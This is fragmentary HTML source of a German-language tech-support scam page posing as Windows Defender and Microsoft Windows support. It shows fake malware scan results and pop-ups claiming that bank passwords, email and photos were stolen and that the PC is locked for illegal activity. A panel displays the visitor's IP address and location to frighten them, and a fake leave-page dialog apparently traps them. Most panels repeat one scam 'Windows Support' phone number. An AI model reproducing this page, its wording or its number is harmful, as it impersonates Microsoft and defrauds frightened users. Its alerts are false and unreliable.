...
<link rel="stylesheet" href="IZE7l1WWO2DU.css">
    ...
    <audio id="mdchys">
            ...
            <div class="col-md-8">
              <div class="activate_lic">
                <ul>
                  <li>
                    <a href="#">
                      <button>Aktivieren Sie die Lizenz</button>
                    </a>
                  </li>
                  <li>
                    <a href="#">
          ...
          <div class="scan_body">
            ...
            <div class="table_quick">
              <table class="table table-bordered">
                <thead>
                  <tr>
                    <th scope="col">Gescanntes Objekt</th>
                    <th scope="col">
          ...
          <div class="scan_footer">
            <div class="row">
              <div class="col-md-6">
                <div class="bt_can">
                  <div class="btn-group" role="group" aria-label="Basic example">
                    <button class="btn btn-secondary" type="button">Scannen</button>
                  </div>
                  <div class="btn-group" role="group" aria-label="Basic example">
              ...
              <div class="col-md-6">
                <div class="bt_can2">
                  <div class="btn-group" role="group" aria-label="Basic example">
                    <button class="btn btn-secondary" type="button">Geplante Scans</button>
                  </div>
                </div>
              </div>
            </div>
        ...
        <div class="row">
          <div class="col-md-12">
            <div class="right-foot" style="text-align:center">
              <span id="footertxt">
                <img src="JhPTQWjeygfO.png"> Windows_Sicherheit </span>
              <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows Supp0rt <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">+43 1 39 5065 7231
                </span>
              </span>
            </div>
          </div>
          <div class="col-md-12">
            <marquee direction="left" height="100px" width="100%">
              <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen verhindert nun, dass unerkannten Anwendungen angezeigt werden. Das Ausführen dieser Anwendung kann Ihr PC-Risiko erhöhen. Der Windows Defender-Scan hat unerwünschte Adware auf diesem Gerät erkannt, die Passwörter, Online-Identitäten, finanzielle Informationen, persönliche Dateien, Fotos und Dokumente stehlen kann。</small>
            </marquee>
          </div>
        </div>
      </div>
      ...
      <div class="lightbox" id="poptxt" onclick="beep1();" style="display: none; cursor:default;">
        ...
        <div id="txtintro2">
          <span class="colo-rd">
             ...
             <p style="font-size:15px;font-weight:400;color:black;">Microsoft Defender hat einige infizierte Dateien gefunden, konnte sie jedoch aufgrund der Berechtigungen der Gruppenrichtlinien nicht entfernen. Bitte scannen Sie jetzt, um sie manuell zu entfernen.</p>

          </span>
        </div>
        <img src="umTUFdyqpkTP.gif" id="banner">
        <div id="disclaimer" style="color:#0F396D;">Rufen Sie den Support an<br>
           <span class="Support" style="font-size:22px;">Windows Support <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">+43 1 39 5065 7231
            </span>
          </span>
        </div>
        <div id="bottom">
          <img src="JhPTQWjeygfO.png" id="badge">
          <span class="title3">Windows_Sicherheit</span>
          <ul>
            <li>
              <a href="#" style="text-decoration: none;">
                <div class="button">
                  <span id="">Scannen</span>
                </div>
              </a>
            </li>
            <li>
      ...
      <div class="cardcontainer" style="cursor: default; display: none;" id="pop_up_new">
        ...
        <p>
         <b>Sicherheitsgründe haben den Zugriff auf diesen PC verhindert.</b>
         </p>
         <p>Ihr Computer wurde als infiziert mit Trojaner-Spyware gemeldet. Die folgenden Daten wurden kompromittiert:</p>
         <p>&gt; Email ID <br>&gt; Bank Passwort <br>&gt; Facebook Anmelden <br>&gt; Fotos und Dokumente </p>
         <p>Ein Windows Defender-Scan hat potenziell unerwünschte Adware auf diesem Gerät erkannt, die Passwörter, Online-Identitäten, finanzielle Informationen, persönliche Dateien, Fotos und Dokumente stehlen kann. </p>
         <p>Bitte kontaktieren Sie uns umgehend. Unser Techniker wird Sie telefonisch durch den Entfernen-Prozess führen. </p>
         <p>Rufen Sie sofort den Windows-Support an, um diese Bedrohung zu melden, Identitätsdiebstahl zu verhindern und den Zugriff auf dieses Gerät wiederherzustellen. </p>
         <p>Das Schließen dieses Fensters kann Ihre persönlichen Informationen gefährden und dazu führen, dass Ihre Windows-Registrierung ausgesetzt wird. </p>
         <p style="padding-bottom:0;color:#fff;font-size:16px">Bitte rufen Sie den Support an:<strong>
            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">   +43 1 39 5065 7231
            </span>
          </strong>
        </p>
        <div class="action_buttons">
          <a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">Erlauben</a>
          <a class="active" id="leave_page" style="color:#fff!important">Verweigern</a>
        </div>
      </div>
      ...
      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
        <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Der Zugriff auf dieses System wurde aus Sicherheitsgründen blockiert. Greifen Sie nicht auf diesen PC zu und starten Sie ihn nicht neu. Wenn Sie diese grundlegende Warnung ignorieren, verlieren Sie möglicherweise Informationen über dieses Framework. Kontaktieren Sie so schnell wie möglich den Support, und ein Microsoft-Experte wird Sie telefonisch durch die Untersuchung leiten. Das Ausführen dieser Anwendung kann Ihr PC-Risiko erhöhen。<br>
          <strong>
         Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    +43 1 39 5065 7231
            </span>
          </strong>
        </p>
      </div>
      ...
      <div id="chrome-alerts" class="chrome-alert" style="padding-top:10px; cursor:pointer;">
        ...
        <!-- <a href="javascript:openlink()" class="cross">×</a> -->
            <p>Seite verlassen?</p>
        <p>Änderungen, die Sie vorgenommen haben, wurden nicht gespeichert.</p>
        <input type="checkbox" id="checkbox" name="checkbox" value="checkbox">
      <label for="checkbox">Verhindern Sie, dass diese Seite zusätzliche Dialoge erstellt.</label><br>
            <div class="action_buttons">
              <a class="" id="leave_page">Abbrechen</a>
              <a class="active" id="leave_page">verlassen</a>
            </div>
        </div>
    </div>
  ...
  if (chromeAlerts) {
    ...
    window.addEventListener("click", function (event) {
      ...
      <div id="chat" style="display: none;" class="bounce3">
        ...
        <br>
        <p>Windows-Technischer Support
        </p>
        <h4 style="font-weight:600;color:#0F396D;font-size:22px">    +43 1 39 5065 7231
          <br>(Support Nummer)<br><br>
        </h4>
      ...
      <div id="login-box">
        ...
        margin-left: 6px;
        position: relative;
        top: 50%;">Dateninformationsalarm !!</span>
        ...
        <p class="text-center" style="color: #fff;  margin-top:10px; font-size: 16px; opacity:.9; ">
          <strong>IP-Adresse: <span id="ipAddress" style="color:red;"></span></strong>
      <br>
      <strong>Stadt: <span id="city" style="color:red;"></span></strong> <br>
      <strong>Gebiet: <span id="region" style="color:red;"></strong> </span><br>
      <strong>Längengrad: <span id="longitude" style="color:red;"></span></strong> <br>
      <strong>Breitengrad: <span id="latitude" style="color:red;"></span></strong> <br>

      <strong>Ihr Gerät wurde aufgrund illegaler Aktivitäten des Staates gesperrt. <span id="state" style="color: red; font-size: 16px;"></span>
      </strong>

       <br><strong>  Kontaktieren Sie den Microsoft Windows Support: +43 1 39 5065 7231	</strong></p>
        ...
        <form action="#">
         ...
         <input type="text" name="name" id="name" placeholder="Kenwort" class="text-input" required="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"><br>

        <input type="submit" class="button1" name="login" value="Anmelden" onclick="playsnd();">
